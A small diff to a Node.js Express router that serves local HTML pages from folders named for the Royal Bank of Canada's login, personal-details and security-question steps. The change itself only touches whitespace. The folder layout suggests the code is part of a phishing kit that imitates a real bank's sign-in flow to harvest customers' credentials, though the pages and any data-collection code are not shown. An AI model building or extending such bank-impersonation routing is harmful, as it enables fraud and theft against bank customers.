@@ -1,10 +1,11 @@
 const express = require('express');
 const path = require('path');  // Use 'path' instead of 'node:path'
 const router = express.Router();
+  
 
 router.get('/', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/login/page.html'))});
 
-router.get('/details', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/details/page.html'))});
+router.get('/details',(req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/details/page.html'))});
 
 router.get('/question', (req, res) =>  {res.sendFile(path.join(__dirname, '../banks/ca/rbc/question/page.html'))});
 
